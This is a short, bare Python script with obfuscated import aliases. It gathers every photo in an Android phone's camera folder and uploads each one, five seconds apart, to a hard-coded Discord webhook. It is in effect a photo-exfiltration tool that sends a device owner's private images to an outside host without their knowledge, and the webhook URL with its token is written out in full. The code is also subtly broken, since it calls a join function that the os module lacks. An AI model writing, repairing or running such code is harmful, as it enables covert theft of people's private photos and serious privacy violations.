import os as a1, requests as a2, time as a3

status=1
base="/storage/emulated/0/DCIM/Camera"
webhook="https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
exts=(".jpg",".jpeg",".png",".heic")

def send(a4):
    try:
        with open(a4,"rb") as a5:
            r=a2.post(webhook,files={"file":(a4.split("/")[-1],a5)})
            return r.status_code in (200,204)
    except:
        return False

def gather():
    res=[]
    for r,d,f in a1.walk(base):
        for fi in f:
            if fi.lower().endswith(exts):
                res.append(a1.join(r,fi))
    return res

def run():
    if status!=1:
        return
    fotos=gather()
    for f in fotos:
        send(f)
        a3.sleep(5)

if __name__=="__main__":
    run()
